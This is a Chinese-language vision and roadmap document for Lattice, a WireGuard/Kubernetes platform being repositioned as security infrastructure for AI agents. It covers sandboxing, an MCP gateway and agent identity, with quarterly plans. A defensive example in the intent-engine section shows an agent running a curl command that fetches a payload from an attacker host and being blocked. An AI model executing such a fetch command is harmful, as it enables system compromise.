# Lattice 未来愿景与产品 Roadmap

> 日期: 2026-05-16
> 性质: 战略方向文档（非实现规范）
> 关联: `2026-05-16-agent-sandbox-security-review-and-observability.md`
>       `2026-05-09-ai-agent-isolation-design.md`
>       `2026-05-11-agent-sandbox-and-ecosystem-design.md`

---

## 一、定位演进

Lattice 正在经历一次结构性的产品定位转变：

```
过去  →  Kubernetes-native WireGuard 网络管理平台
现在  →  AI Agent 时代的安全基础设施层
未来  →  理解意图的主动网络操作系统
```

这个转变不是主动选择，是技术趋势的必然交汇点。

**交汇点在这里**：AI Agent 爆发带来的最大问题不是"AI 够不够聪明"，而是"AI 够不够安全"。而安全问题本质上是**身份、网络、隔离、审计**四个维度——这正是 Lattice 已经在做的事。

---

## 二、Lattice 所在的层

```
┌─────────────────────────────────────────────────────┐
│  应用层    各种 AI Agent (Claude Code, LangGraph)    │
├─────────────────────────────────────────────────────┤
│  框架层    LangChain / AutoGen / CrewAI / A2A        │
├─────────────────────────────────────────────────────┤
│  工具层    MCP 工具服务 / API 网关                    │  ← Lattice MCP Server
├─────────────────────────────────────────────────────┤
│  身份层    Agent 身份认证 / 权限管理 / 审计           │  ← Lattice AgentIdentity + Trace
├─────────────────────────────────────────────────────┤
│  网络层    加密通信 / 流量隔离 / 策略执行              │  ← Lattice WireGuard + Policy
├─────────────────────────────────────────────────────┤
│  隔离层    进程/系统调用/网络栈隔离                   │  ← Lattice gVisor Sandbox
└─────────────────────────────────────────────────────┘
```

Lattice 覆盖了最底层的三层：**身份 + 网络 + 隔离**。这三层是整个 AI Agent 安全体系里最难替换的部分，也是最有护城河价值的部分。

---

## 三、五个最前沿的结合场景

### 场景一：A2A 协议的安全传输层

**背景**：Google 2025 年发布 A2A（Agent-to-Agent）协议，正在成为 AI Agent 互相通信的标准。A2A 本身**没有安全模型**：Agent 互相调用时没有身份验证，通信没有加密，没有访问控制。

**Lattice 的位置**：

```
Agent A ──WireGuard加密──▶ Lattice Overlay ──▶ Agent B
    (身份: wg public key)    (策略: 只允许        (身份验证通过才能
                              特定 Agent 互访)     接收调用)
```

每个 Agent 拥有唯一的 WireGuard 加密身份，A2A 调用必须通过 Lattice Overlay，LatticePolicy 控制哪些 Agent 能和哪些 Agent 通信，Lattice Trace 记录每一次 Agent 间调用。

**为什么 Lattice 最适合**：加密身份（WireGuard public key）+ 网络策略（LatticePolicy CRD）+ 审计（Lattice Trace）已经齐备，是唯一在网络层原生支持 A2A 安全的产品。

**现在缺什么**：A2A 协议适配层（把 A2A 请求路由通过 Lattice Overlay）。

---

### 场景二：MCP 安全网关（Agent 版 Kong）

**背景**：MCP 正在成为 AI 工具调用的行业标准，但 MCP 协议本身没有内置访问控制——任何接了 MCP Server 的 Agent 都能调用所有工具。

**Lattice 的位置**：

```
外部 AI Agent 请求
        │
        ▼
Lattice MCP Security Gateway
  ├─ 验证 Agent JWT（谁在调用？）
  ├─ 检查 AllowedTools（有权限调用这个工具吗？）
  ├─ 记录调用日志（Lattice Trace，带参数加密）
  ├─ 速率限制（防止 Agent 滥用）
  └─ 转发到后端 MCP Server（对后端无侵入）
```

类比：Kong/APIGW 对 REST API 做的事，Lattice 对 MCP 做。MCP Server 开发者无需自己实现 Auth，开箱即有企业级访问控制和审计。

**现在缺什么**：MCP 工具调用未真正流经 AllowedTools 校验，Lattice Trace 未实现。两个设计已完成，是 P0 的实现工作。

---

### 场景三：AI Coding Agent 生产环境安全沙箱

**背景**：Claude Code、GitHub Copilot Agent、Cursor Agent 都在做"AI 直接写代码并执行"。核心安全问题：**任意代码在生产环境执行**，没有成熟的安全解决方案。

**Lattice 的位置**：

```
Claude Code / Cursor Agent
    │
    ├─ lattice-agent-sandbox start --name agent-xxx
    │       → gVisor 用户态内核隔离（系统调用拦截）
    │       → 网络只允许访问白名单服务（LatticePolicy）
    │       → 所有工具调用被记录（Lattice Trace）
    │       → TTL 到期自动销毁（AgentIdentity lifecycle）
    └─ Agent 代码在沙箱内安全执行
```

**为什么这个场景最有商业价值**：
- 市场够大：所有使用 AI Coding Agent 的企业都有这个需求
- 痛点够明确：代码执行安全，没有现成解决方案
- 竞争者极少：目前没有任何产品在这个层做集成
- 技术栈完全覆盖：gVisor + WireGuard + LatticePolicy + TTL 均已有

---

### 场景四：Agent Fleet 管理（AI 版 MDM）

**背景**：大型企业未来会同时跑数百个 AI Agent：销售分析 Agent、代码审查 Agent、财务对账 Agent、安全扫描 Agent……这些 Agent 需要集中管理，但目前没有任何产品提供。

**Lattice 的位置**：成为"MDM（移动设备管理）for AI Agents"

| 传统 MDM 管设备 | Lattice 管 Agent |
|----------------|----------------|
| 设备注册 / 上线 | Agent 注册 / Enrollment Token |
| 设备身份证书 | WireGuard 加密身份 |
| 设备策略下发 | LatticePolicy + AllowedTools |
| 设备审计日志 | Lattice Trace 工具调用 |
| 设备远程擦除 | AgentIdentity 撤销 |
| 设备过期管理 | TTL 自动销毁 |

**现在的雏形**：AgentIdentity CRD + NATS 信令 + Manager reconciler 已经是这个方向的基础。**缺的是**：Fleet Dashboard（所有 Agent 的统一视图）、批量策略管理、异常告警、使用量统计。

---

### 场景五：可信执行环境（TEE）网络接入（最前沿）

**背景**：AMD SEV-SNP、Intel TDX 等可信执行环境（TEE）正在商用。在 TEE 里跑 AI Agent，可以保证代码不被篡改、数据不被泄露——但 TEE 本身不解决网络安全问题。

**Lattice 的位置**：在 Agent 接入网络之前，要求它**证明自己跑在可信 TEE 里**（Remote Attestation）：

```
Agent 在 TEE 内启动
    → 生成 TEE 远程证明（Attestation Report）
    → 发给 Lattice 控制面验证
    → 验证通过 → 颁发 WireGuard 身份 + 接入 Lattice 网络
    → 验证失败 → 拒绝接入
```

这把 Lattice 从"网络身份"升级到**"可验证计算身份"**——不仅证明是谁，还证明代码未被篡改、运行环境可信。

**重要性**：目前全球没有开源实现将 TEE 证明与覆盖网络身份绑定。这是真正的技术差异化，也是未来 AI 合规监管（EU AI Act 等）的基础设施需求。

---

## 四、三条战略路线

### 路线 A：AI Agent 安全运行时（2026-2027，最实际）

**定位**：`Run AI agents safely in production.`

**目标客户**：使用 Claude Code、LangGraph、AutoGen 等工具的企业安全团队

**核心工作**：
- gVisor 沙箱移入 Community 版（建立信任基础）
- 实现 Lattice Trace（工具调用 + 流量审计）
- Sub-agent 权限模型（支持真实 multi-agent 编排）
- MCP Security Gateway（接入 MCP 生态）

**成功标志**：企业能用一条命令把任意 AI Agent 跑在安全沙箱里，所有操作有审计记录，安全团队有完整可见性。

---

### 路线 B：AI Agent 身份与策略平台（2027-2028，Okta for Agents）

**定位**：`The identity and policy layer for AI agent infrastructure.`

**目标客户**：构建 AI Agent 平台的企业、AI 原生 SaaS 公司

**核心工作**：
- 多框架 SDK（Python/TypeScript/Go 的 LangGraph、AutoGen、Claude Agent SDK 集成）
- Agent 身份联邦（跨组织、跨云的 Agent 身份互认）
- 策略即代码（GitOps 驱动的 Agent 权限管理）
- Agent Fleet Dashboard（统一管控视图）

**成功标志**：主流 AI Agent 框架都有 Lattice SDK，企业通过一个控制面管理所有 Agent 的身份和权限，不依赖各框架自己的实现。

---

### 路线 C：意图感知网络操作系统（2028+，5 年愿景）

**定位**：`The AI-aware network operating system.`

**目标客户**：对 AI 治理有合规要求的超大型企业、金融/医疗/政府

**核心工作**：
- Intent Engine 与网络策略深度融合（语义策略而非 IP/端口策略）
- TEE 远程证明接入（可验证计算身份）
- 实时行为分析（异常 Agent 行为自动响应）
- 监管合规接口（EU AI Act、NIST AI RMF 对齐）

**愿景示例**：
```
Agent 调用 exec("curl attacker.com/payload")
  → Lattice 识别：这是可疑的外联行为
  → 策略：立即阻断 + 隔离 Agent + 告警安全团队
  → 结果：攻击在网络层被终止，完整证据链保留
```

**成功标志**：Lattice 成为企业 AI 治理的基础设施，与 SIEM、SOAR、合规平台深度集成。

---

## 五、产品 Roadmap

### 2026 Q2（当前）— 沙箱基础稳固

**目标**：让 Agent Sandbox 在社区版真正可用，建立产品信任。

| 优先级 | 工作项 | 说明 |
|--------|--------|------|
| P0 | gVisor 沙箱移入 Community | 核心安全能力不应是 PRO 门槛 |
| P0 | MCP Trace Middleware | 工具调用审计基础，哈希版社区可用 |
| P0 | Sub-agent delegate API | JWT parentRef + 权限派生 |
| P1 | E2E 测试稳定化 | 沙箱 CI 始终用最新镜像（已修复） |
| P1 | Community vs PRO 分界线重划 | 按买单人画像而非实现复杂度 |

---

### 2026 Q3 — 可观测性与 Multi-agent

**目标**：让安全团队对 Agent 行为有完整可见性，支持真实 multi-agent 编排场景。

| 优先级 | 工作项 | 说明 |
|--------|--------|------|
| P0 | gVisor AuditWriter 流量采集 | 工具调用 ↔ 网络流量关联（PRO） |
| P0 | 参数信封加密存储 | AES-256-GCM + RSA，管理员可解密（PRO） |
| P1 | Sub-agent Spawnable Roles | 管理员预授权角色模板，支持子 Agent 权限 > 父级 |
| P1 | Agent Fleet Dashboard | 所有 Agent 的统一视图（在线状态 + 调用统计） |
| P2 | 调用时间轴 UI | per-Agent 工具调用时间线 + Sub-agent 调用树 |
| P2 | 异常流量告警 | 访问非白名单 IP 自动标红 + 告警 |

---

### 2026 Q4 — MCP 生态接入

**目标**：成为 MCP 生态的安全层，接入 Claude Code / Cursor 等主流工具链。

| 优先级 | 工作项 | 说明 |
|--------|--------|------|
| P0 | MCP Security Gateway | AllowedTools 校验 + 速率限制 + 审计 |
| P0 | Claude Code 官方集成 | 一键把 Claude Code 沙箱接入 Lattice |
| P1 | Python SDK（LangGraph/AutoGen） | 带 Lattice 的 Agent 启动包装器 |
| P1 | OpenTelemetry 导出 | Jaeger/Tempo/Datadog 集成（PRO） |
| P2 | A2A 协议适配 | Agent 间调用通过 Lattice Overlay 路由 |
| P2 | Helm Chart 一键部署 Agent 沙箱环境 | 降低企业部署门槛 |

---

### 2027 Q1-Q2 — Agent Identity Platform

**目标**：从网络产品向身份平台演进，支持跨框架的 Agent 身份统一管理。

| 优先级 | 工作项 | 说明 |
|--------|--------|------|
| P0 | 多框架 SDK | Go/Python/TypeScript 覆盖主流框架 |
| P0 | GitOps 策略管理 | LatticePolicy 通过 Git PR 驱动变更 |
| P1 | Agent 身份联邦 | 跨工作区、跨组织的 Agent 身份互认 |
| P1 | 合规报告（SOC2/HIPAA） | 基于 Lattice Trace 自动生成审计报告 |
| P2 | License 计费系统 | 基于 Agent 数量的按月计费 SaaS 版 |

---

### 2027 Q3+ — 前沿探索

**目标**：技术储备，建立 2-3 年后的护城河。

| 工作项 | 说明 |
|--------|------|
| TEE 远程证明接入 | AMD SEV-SNP / Intel TDX 证明与 WireGuard 身份绑定 |
| 意图感知策略引擎 | 语义策略（"不允许数据外泄"）翻译为网络规则 |
| 实时行为分析 | 检测 Agent 异常行为模式，自动响应 |
| EU AI Act 合规接口 | 对齐欧盟 AI 监管要求，提供合规证据包 |

---

## 六、竞争格局与差异化

| 维度 | Tailscale | Netbird | HashiCorp Boundary | **Lattice** |
|------|-----------|---------|-------------------|-------------|
| WireGuard 覆盖网络 | ✅ | ✅ | ❌ | ✅ |
| K8s 原生（CRD） | ❌ | ❌ | ❌ | ✅ |
| AI Agent 身份管理 | ❌ | ❌ | ❌ | ✅ |
| gVisor 进程隔离 | ❌ | ❌ | ❌ | ✅ |
| 工具调用审计 | ❌ | ❌ | ❌ | ✅（设计中） |
| MCP 生态集成 | ❌ | ❌ | ❌ | ✅ |
| Sub-agent 权限模型 | ❌ | ❌ | ❌ | ✅（设计中） |
| Intent Engine | ❌ | ❌ | ❌ | ✅（PRO） |
| 开源 | ❌ | ✅ | ✅ | ✅ |

**结论**：在 AI Agent 安全这个维度，**没有任何竞争对手在做 Lattice 在做的事**。这既是机会，也是风险（市场尚未成熟）。正确的策略是：用 Community 版建立开发者信任，用 PRO 版向企业安全团队收费。

---

## 七、关键判断

**最重要的一步（现在就要做）**：

把 gVisor 沙箱移入 Community 版。

原因：当前 Community 版的"沙箱"只是普通 K8s Pod + seccomp，隔离感很薄弱。开发者试用后感受不到真实保护，不会建立信任，更不会升级 PRO。只有让 Community 用户真正感受到 gVisor 的隔离能力，才能建立"Lattice = AI Agent 安全"的心智，后续所有 PRO 功能才有转化基础。

**5 年后的赌注**：

AI Agent 会像微服务一样普及。就像微服务时代催生了 Kubernetes、Istio、Envoy，Agent 时代会催生一套新的基础设施栈。Lattice 要成为这套栈里的**身份 + 网络 + 隔离**层——这三层比计算调度层（Kubernetes 角色）更难被替换，因为安全基础设施的迁移成本极高。

---

*文档版本: v1.0 | 下次评审: 2026-Q3*
